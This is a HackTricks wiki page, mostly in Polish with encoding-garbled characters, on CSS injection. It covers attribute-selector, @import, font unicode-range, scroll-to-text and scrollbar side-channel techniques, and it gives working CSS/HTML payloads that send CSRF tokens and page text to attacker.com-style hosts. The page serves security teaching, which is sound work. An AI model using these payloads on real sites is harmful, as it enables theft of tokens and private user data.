# CSS Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## CSS Injection

### Attribute Selector

Selektory CSS sÄ… tworzone, aby dopasowaÄ‡ wartoÅ›ci atrybutÃ³w `name` i `value` elementu `input`. JeÅ›li atrybut wartoÅ›ci elementu wejÅ›ciowego zaczyna siÄ™ od okreÅ›lonego znaku, Å‚adowany jest zdefiniowany zewnÄ™trzny zasÃ³b:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
JednakÅ¼e, to podejÅ›cie napotyka ograniczenie w przypadku ukrytych elementÃ³w wejÅ›ciowych (`type="hidden"`), poniewaÅ¼ ukryte elementy nie Å‚adujÄ… tÅ‚a.

#### OminiÄ™cie dla Ukrytych ElementÃ³w

Aby obejÅ›Ä‡ to ograniczenie, moÅ¼esz celowaÄ‡ w nastÄ™pny element rodzeÅ„stwa, uÅ¼ywajÄ…c kombinatora rodzeÅ„stwa ogÃ³lnego `~`. ReguÅ‚a CSS nastÄ™pnie stosuje siÄ™ do wszystkich rodzeÅ„stw nastÄ™pujÄ…cych po ukrytym elemencie wejÅ›ciowym, powodujÄ…c zaÅ‚adowanie obrazu tÅ‚a:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Prerequisites for CSS Injection

Aby technika CSS Injection byÅ‚a skuteczna, muszÄ… byÄ‡ speÅ‚nione okreÅ›lone warunki:

1. **DÅ‚ugoÅ›Ä‡ Å‚adunku**: Wektor wstrzykniÄ™cia CSS musi obsÅ‚ugiwaÄ‡ wystarczajÄ…co dÅ‚ugie Å‚adunki, aby pomieÅ›ciÄ‡ skonstruowane selektory.
2. **Ponowna ocena CSS**: PowinieneÅ› mieÄ‡ moÅ¼liwoÅ›Ä‡ osadzenia strony, co jest konieczne do wywoÅ‚ania ponownej oceny CSS z nowo wygenerowanymi Å‚adunkami.
3. **Zasoby zewnÄ™trzne**: Technika zakÅ‚ada moÅ¼liwoÅ›Ä‡ korzystania z obrazÃ³w hostowanych zewnÄ™trznie. MoÅ¼e to byÄ‡ ograniczone przez PolitykÄ™ BezpieczeÅ„stwa TreÅ›ci (CSP) witryny.

### Blind Attribute Selector

Jak [**wyjaÅ›niono w tym poÅ›cie**](https://portswigger.net/research/blind-css-exfiltration), moÅ¼liwe jest poÅ‚Ä…czenie selektorÃ³w **`:has`** i **`:not`** w celu identyfikacji treÅ›ci nawet z elementÃ³w niewidocznych. Jest to bardzo przydatne, gdy nie masz pojÄ™cia, co znajduje siÄ™ na stronie Å‚adujÄ…cej wstrzykniÄ™cie CSS.\
MoÅ¼liwe jest rÃ³wnieÅ¼ uÅ¼ycie tych selektorÃ³w do wyodrÄ™bnienia informacji z kilku blokÃ³w tego samego typu, jak w:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
ÅÄ…czÄ…c to z nastÄ™pujÄ…cÄ… technikÄ… **@import**, moÅ¼liwe jest wyeksfiltrowanie duÅ¼ej iloÅ›ci **informacji za pomocÄ… wstrzykiwania CSS z niewidocznych stron przy uÅ¼yciu** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Poprzednia technika ma pewne wady, sprawdÅº wymagania wstÄ™pne. Musisz byÄ‡ w stanie **wysÅ‚aÄ‡ wiele linkÃ³w do ofiary**, lub musisz byÄ‡ w stanie **iframe'owaÄ‡ stronÄ™ podatnÄ… na wstrzykiwanie CSS**.

Jednak istnieje inna sprytna technika, ktÃ³ra wykorzystuje **CSS `@import`**, aby poprawiÄ‡ jakoÅ›Ä‡ techniki.

ZostaÅ‚o to po raz pierwszy pokazane przez [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i dziaÅ‚a to w ten sposÃ³b:

Zamiast Å‚adowaÄ‡ tÄ™ samÄ… stronÄ™ raz za razem z dziesiÄ…tkami rÃ³Å¼nych Å‚adunkÃ³w za kaÅ¼dym razem (jak w poprzedniej), zamierzamy **zaÅ‚adowaÄ‡ stronÄ™ tylko raz i tylko z importem do serwera atakujÄ…cego** (to jest Å‚adunek do wysÅ‚ania do ofiary):
```css
@import url('//attacker.com:5001/start?');
```
1. Import bÄ™dzie **otrzymywaÅ‚ jakiÅ› skrypt CSS** od atakujÄ…cych, a **przeglÄ…darka go zaÅ‚aduje**.
2. Pierwsza czÄ™Å›Ä‡ skryptu CSS, ktÃ³rÄ… wyÅ›le atakujÄ…cy, to **kolejny `@import` do serwera atakujÄ…cych.**
1. Serwer atakujÄ…cych nie odpowie na to Å¼Ä…danie jeszcze, poniewaÅ¼ chcemy wycieknÄ…Ä‡ kilka znakÃ³w, a nastÄ™pnie odpowiedzieÄ‡ na ten import Å‚adunkiem, aby wycieknÄ…Ä‡ nastÄ™pne.
3. Druga i wiÄ™ksza czÄ™Å›Ä‡ Å‚adunku bÄ™dzie **Å‚adunkiem wycieku selektora atrybutu**
1. To wyÅ›le do serwera atakujÄ…cych **pierwszy znak sekretu i ostatni.**
4. Gdy serwer atakujÄ…cych otrzyma **pierwszy i ostatni znak sekretu**, **odpowie na import Å¼Ä…dany w kroku 2**.
1. OdpowiedÅº bÄ™dzie dokÅ‚adnie taka sama jak w **krokach 2, 3 i 4**, ale tym razem sprÃ³buje **znaleÅºÄ‡ drugi znak sekretu, a nastÄ™pnie przedostatni**.

AtakujÄ…cy **bÄ™dzie podÄ…Å¼aÅ‚ za tÄ… pÄ™tlÄ…, aÅ¼ uda mu siÄ™ caÅ‚kowicie wycieknÄ…Ä‡ sekret**.

MoÅ¼esz znaleÅºÄ‡ oryginalny [**kod Pepe Vili do wykorzystania tego tutaj**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) lub moÅ¼esz znaleÅºÄ‡ prawie [**ten sam kod, ale skomentowany tutaj**.](./#css-injection)

{% hint style="info" %}
Skrypt sprÃ³buje odkryÄ‡ 2 znaki za kaÅ¼dym razem (od poczÄ…tku i od koÅ„ca), poniewaÅ¼ selektor atrybutu pozwala na robienie rzeczy takich jak:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
To pozwala skryptowi na szybsze wyciekniÄ™cie sekretu.  
{% endhint %}

{% hint style="warning" %}
Czasami skrypt **nie wykrywa poprawnie, Å¼e odkryty prefiks + sufiks to juÅ¼ peÅ‚na flaga** i bÄ™dzie kontynuowaÅ‚ do przodu (w prefiksie) i do tyÅ‚u (w sufiksie), a w pewnym momencie siÄ™ zawiesi.\
Nie martw siÄ™, po prostu sprawdÅº **wyjÅ›cie**, poniewaÅ¼ **moÅ¼esz tam zobaczyÄ‡ flagÄ™**.  
{% endhint %}

### Inne selektory

Inne sposoby dostÄ™pu do czÄ™Å›ci DOM za pomocÄ… **sektorÃ³w CSS**:

* **`.class-to-search:nth-child(2)`**: To wyszuka drugi element z klasÄ… "class-to-search" w DOM.
*   **`:empty`** selektor: UÅ¼ywany na przykÅ‚ad w [**tym opisie**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### Atak XS-Search oparty na bÅ‚Ä™dach

**Referencja:** [Atak oparty na CSS: Wykorzystywanie unicode-range w @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [PoC XS-Search oparty na bÅ‚Ä™dach autorstwa @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

OgÃ³lnym zamiarem jest **uÅ¼ycie niestandardowej czcionki z kontrolowanego punktu koÅ„cowego** i zapewnienie, Å¼e **tekst (w tym przypadku 'A') jest wyÅ›wietlany tÄ… czcionkÄ… tylko wtedy, gdy okreÅ›lony zasÃ³b (`favicon.ico`) nie moÅ¼e byÄ‡ zaÅ‚adowany**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **UÅ¼ycie niestandardowej czcionki**:
- Niestandardowa czcionka jest definiowana za pomocÄ… reguÅ‚y `@font-face` w tagu `<style>` w sekcji `<head>`.
- Czcionka nazywa siÄ™ `poc` i jest pobierana z zewnÄ™trznego punktu koÅ„cowego (`http://attacker.com/?leak`).
- WÅ‚aÅ›ciwoÅ›Ä‡ `unicode-range` jest ustawiona na `U+0041`, celujÄ…c w konkretny znak Unicode 'A'.

2. **Element Object z tekstem zapasowym**:
- Element `<object>` z `id="poc0"` jest tworzony w sekcji `<body>`. Element ten prÃ³buje zaÅ‚adowaÄ‡ zasÃ³b z `http://192.168.0.1/favicon.ico`.
- `font-family` dla tego elementu jest ustawiona na `'poc'`, zgodnie z definicjÄ… w sekcji `<style>`.
- JeÅ›li zasÃ³b (`favicon.ico`) nie uda siÄ™ zaÅ‚adowaÄ‡, zawartoÅ›Ä‡ zapasowa (litera 'A') wewnÄ…trz tagu `<object>` jest wyÅ›wietlana.
- ZawartoÅ›Ä‡ zapasowa ('A') bÄ™dzie renderowana przy uÅ¼yciu niestandardowej czcionki `poc`, jeÅ›li zewnÄ™trzny zasÃ³b nie moÅ¼e byÄ‡ zaÅ‚adowany.

### Stylizacja fragmentu tekstu przewijanego

Pseudo-klasa **`:target`** jest uÅ¼ywana do wybierania elementu, ktÃ³ry jest celowany przez **fragment URL**, jak okreÅ›lono w [specyfikacji CSS Selectors Level 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). WaÅ¼ne jest, aby zrozumieÄ‡, Å¼e `::target-text` nie pasuje do Å¼adnych elementÃ³w, chyba Å¼e tekst jest wyraÅºnie celowany przez fragment.

Pojawia siÄ™ problem bezpieczeÅ„stwa, gdy atakujÄ…cy wykorzystujÄ… funkcjÄ™ **Scroll-to-text** fragment, co pozwala im potwierdziÄ‡ obecnoÅ›Ä‡ konkretnego tekstu na stronie internetowej, Å‚adujÄ…c zasÃ³b z ich serwera poprzez wstrzykniÄ™cie HTML. Metoda polega na wstrzykniÄ™ciu reguÅ‚y CSS, takiej jak ta:
```css
:target::before { content : url(target.png) }
```
W takich scenariuszach, jeÅ›li tekst "Administrator" jest obecny na stronie, zasÃ³b `target.png` jest Å¼Ä…dany z serwera, co wskazuje na obecnoÅ›Ä‡ tekstu. PrzykÅ‚ad tego ataku moÅ¼na wykonaÄ‡ za pomocÄ… specjalnie przygotowanego URL, ktÃ³ry osadza wstrzykniÄ™ty CSS obok fragmentu Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Here, atak manipuluje wstrzykniÄ™ciem HTML, aby przesÅ‚aÄ‡ kod CSS, celujÄ…c w konkretny tekst "Administrator" za pomocÄ… fragmentu Scroll-to-text (`#:~:text=Administrator`). JeÅ›li tekst zostanie znaleziony, wskazany zasÃ³b jest Å‚adowany, nieumyÅ›lnie sygnalizujÄ…c swojÄ… obecnoÅ›Ä‡ atakujÄ…cemu.

Aby zÅ‚agodziÄ‡ ryzyko, naleÅ¼y zwrÃ³ciÄ‡ uwagÄ™ na nastÄ™pujÄ…ce punkty:

1. **Ograniczone dopasowanie STTF**: Fragment Scroll-to-text (STTF) jest zaprojektowany do dopasowywania tylko sÅ‚Ã³w lub zdaÅ„, co ogranicza jego zdolnoÅ›Ä‡ do wyciekÃ³w dowolnych sekretÃ³w lub tokenÃ³w.
2. **Ograniczenie do kontekstÃ³w przeglÄ…dania na najwyÅ¼szym poziomie**: STTF dziaÅ‚a wyÅ‚Ä…cznie w kontekstach przeglÄ…dania na najwyÅ¼szym poziomie i nie funkcjonuje w ramach iframe, co sprawia, Å¼e wszelkie prÃ³by wykorzystania sÄ… bardziej zauwaÅ¼alne dla uÅ¼ytkownika.
3. **KoniecznoÅ›Ä‡ aktywacji przez uÅ¼ytkownika**: STTF wymaga gestu aktywacji przez uÅ¼ytkownika do dziaÅ‚ania, co oznacza, Å¼e wykorzystania sÄ… moÅ¼liwe tylko poprzez nawigacje inicjowane przez uÅ¼ytkownika. WymÃ³g ten znacznie zmniejsza ryzyko automatyzacji atakÃ³w bez interakcji uÅ¼ytkownika. Niemniej jednak autor wpisu na blogu wskazuje na konkretne warunki i obejÅ›cia (np. inÅ¼ynieria spoÅ‚eczna, interakcja z powszechnymi rozszerzeniami przeglÄ…darki), ktÃ³re mogÄ… uÅ‚atwiÄ‡ automatyzacjÄ™ ataku.

ÅšwiadomoÅ›Ä‡ tych mechanizmÃ³w i potencjalnych luk jest kluczowa dla utrzymania bezpieczeÅ„stwa w sieci i ochrony przed takimi taktykami eksploatacyjnymi.

Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº oryginalny raport: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

MoÅ¼esz sprawdziÄ‡ [**eksploitacjÄ™ wykorzystujÄ…cÄ… tÄ™ technikÄ™ dla CTF tutaj**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

MoÅ¼esz okreÅ›liÄ‡ **zewnÄ™trzne czcionki dla konkretnych wartoÅ›ci unicode**, ktÃ³re bÄ™dÄ… **zbierane tylko wtedy, gdy te wartoÅ›ci unicode sÄ… obecne** na stronie. Na przykÅ‚ad:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Ekstrakcja wÄ™zÅ‚a tekstowego (I): ligatury <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Technika opisana polega na ekstrakcji tekstu z wÄ™zÅ‚a poprzez wykorzystanie ligatur czcionek i monitorowanie zmian w szerokoÅ›ci. Proces skÅ‚ada siÄ™ z kilku krokÃ³w:

1. **Tworzenie niestandardowych czcionek**:
- Czcionki SVG sÄ… tworzone z glifami majÄ…cymi atrybut `horiz-adv-x`, ktÃ³ry ustawia duÅ¼Ä… szerokoÅ›Ä‡ dla glifu reprezentujÄ…cego sekwencjÄ™ dwÃ³ch znakÃ³w.
- PrzykÅ‚ad glifu SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gdzie "XY" oznacza sekwencjÄ™ dwÃ³ch znakÃ³w.
- Te czcionki sÄ… nastÄ™pnie konwertowane do formatu woff za pomocÄ… fontforge.

2. **Wykrywanie zmian szerokoÅ›ci**:
- CSS jest uÅ¼ywane, aby zapewniÄ‡, Å¼e tekst nie zawija siÄ™ (`white-space: nowrap`) i aby dostosowaÄ‡ styl paska przewijania.
- Pojawienie siÄ™ poziomego paska przewijania, stylizowanego w sposÃ³b odmienny, dziaÅ‚a jako wskaÅºnik (oracle), Å¼e w tekÅ›cie obecna jest okreÅ›lona ligatura, a tym samym okreÅ›lona sekwencja znakÃ³w.
- UÅ¼yty CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proces eksploatacji**:
- **Krok 1**: Tworzone sÄ… czcionki dla par znakÃ³w o znacznej szerokoÅ›ci.
- **Krok 2**: Wykorzystywana jest sztuczka oparta na pasku przewijania, aby wykryÄ‡, kiedy renderowany jest duÅ¼y glif (ligatura dla pary znakÃ³w), co wskazuje na obecnoÅ›Ä‡ sekwencji znakÃ³w.
- **Krok 3**: Po wykryciu ligatury generowane sÄ… nowe glify reprezentujÄ…ce sekwencje trzech znakÃ³w, wÅ‚Ä…czajÄ…c wykrytÄ… parÄ™ i dodajÄ…c znak poprzedzajÄ…cy lub nastÄ™pujÄ…cy.
- **Krok 4**: Wykrywanie ligatury trzech znakÃ³w jest przeprowadzane.
- **Krok 5**: Proces powtarza siÄ™, stopniowo ujawniajÄ…c caÅ‚y tekst.

4. **Optymalizacja**:
- Obecna metoda inicjalizacji uÅ¼ywajÄ…ca `<meta refresh=...` nie jest optymalna.
- Bardziej efektywne podejÅ›cie mogÅ‚oby obejmowaÄ‡ sztuczkÄ™ CSS `@import`, poprawiajÄ…c wydajnoÅ›Ä‡ eksploatu.

### Ekstrakcja wÄ™zÅ‚a tekstowego (II): wyciek zestawu znakÃ³w za pomocÄ… domyÅ›lnej czcionki (nie wymagajÄ…cej zewnÄ™trznych zasobÃ³w) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ta sztuczka zostaÅ‚a opublikowana w tym [**wÄ…tku Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Zestaw znakÃ³w uÅ¼yty w wÄ™Åºle tekstowym moÅ¼e byÄ‡ wyciekany **za pomocÄ… domyÅ›lnych czcionek** zainstalowanych w przeglÄ…darce: nie sÄ… potrzebne zewnÄ™trzne - ani niestandardowe - czcionki.

Koncepcja opiera siÄ™ na wykorzystaniu animacji do stopniowego rozszerzania szerokoÅ›ci `div`, pozwalajÄ…c jednemu znakowi na przejÅ›cie z czÄ™Å›ci 'sufiksowej' tekstu do czÄ™Å›ci 'prefiksowej'. Proces ten skutecznie dzieli tekst na dwie sekcje:

1. **Prefiks**: PoczÄ…tkowa linia.
2. **Sufiks**: Kolejna linia(y).

Etapy przejÅ›cia znakÃ³w bÄ™dÄ… wyglÄ…daÄ‡ nastÄ™pujÄ…co:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Podczas tego przejÅ›cia wykorzystywana jest **sztuczka unicode-range** do identyfikacji kaÅ¼dego nowego znaku, gdy doÅ‚Ä…cza do prefiksu. OsiÄ…ga siÄ™ to poprzez zmianÄ™ czcionki na Comic Sans, ktÃ³ra jest zauwaÅ¼alnie wyÅ¼sza niÅ¼ domyÅ›lna czcionka, co w konsekwencji wywoÅ‚uje pojawienie siÄ™ paska przewijania w pionie. Pojawienie siÄ™ tego paska przewijania poÅ›rednio ujawnia obecnoÅ›Ä‡ nowego znaku w prefiksie.

ChociaÅ¼ ta metoda pozwala na wykrywanie unikalnych znakÃ³w w miarÄ™ ich pojawiania siÄ™, nie okreÅ›la, ktÃ³ry znak jest powtarzany, tylko Å¼e wystÄ…piÅ‚o powtÃ³rzenie.

{% hint style="info" %}
W zasadzie, **unicode-range jest uÅ¼ywane do wykrywania znaku**, ale poniewaÅ¼ nie chcemy Å‚adowaÄ‡ zewnÄ™trznej czcionki, musimy znaleÅºÄ‡ inny sposÃ³b.\
Gdy **znak** jest **znaleziony**, otrzymuje **wstÄ™pnie zainstalowanÄ… czcionkÄ™ Comic Sans**, ktÃ³ra **powiÄ™ksza** znak i **wywoÅ‚uje pasek przewijania**, ktÃ³ry **ujawnia znaleziony znak**.
{% endhint %}

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Ekstrakcja wÄ™zÅ‚a tekstowego (III): wyciek zestawu znakÃ³w za pomocÄ… domyÅ›lnej czcionki przez ukrywanie elementÃ³w (nie wymagajÄ…ce zewnÄ™trznych zasobÃ³w) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencja:** To jest wspomniane jako [nieudane rozwiÄ…zanie w tym opisie](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ten przypadek jest bardzo podobny do poprzedniego, jednak w tym przypadku celem powiÄ™kszenia konkretnych **znakÃ³w w porÃ³wnaniu do innych jest ukrycie czegoÅ›** takiego jak przycisk, aby nie zostaÅ‚ naciÅ›niÄ™ty przez bota lub obraz, ktÃ³ry nie zostanie zaÅ‚adowany. MoÅ¼emy wiÄ™c zmierzyÄ‡ akcjÄ™ (lub brak akcji) i wiedzieÄ‡, czy konkretny znak jest obecny w tekÅ›cie.

### Ekstrakcja wÄ™zÅ‚a tekstowego (III): wyciek zestawu znakÃ³w przez czas pamiÄ™ci podrÄ™cznej (nie wymagajÄ…ce zewnÄ™trznych zasobÃ³w) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencja:** To jest wspomniane jako [nieudane rozwiÄ…zanie w tym opisie](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku moÅ¼emy sprÃ³bowaÄ‡ wyciekowaÄ‡, czy znak znajduje siÄ™ w tekÅ›cie, Å‚adujÄ…c faÅ‚szywÄ… czcionkÄ™ z tego samego ÅºrÃ³dÅ‚a:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
JeÅ›li wystÄ™puje dopasowanie, **czcionka zostanie zaÅ‚adowana z `/static/bootstrap.min.css?q=1`**. ChociaÅ¼ nie zaÅ‚aduje siÄ™ pomyÅ›lnie, **przeglÄ…darka powinna jÄ… zbuforowaÄ‡**, a nawet jeÅ›li nie ma bufora, istnieje mechanizm **304 not modified**, wiÄ™c **odpowiedÅº powinna byÄ‡ szybsza** niÅ¼ inne rzeczy.

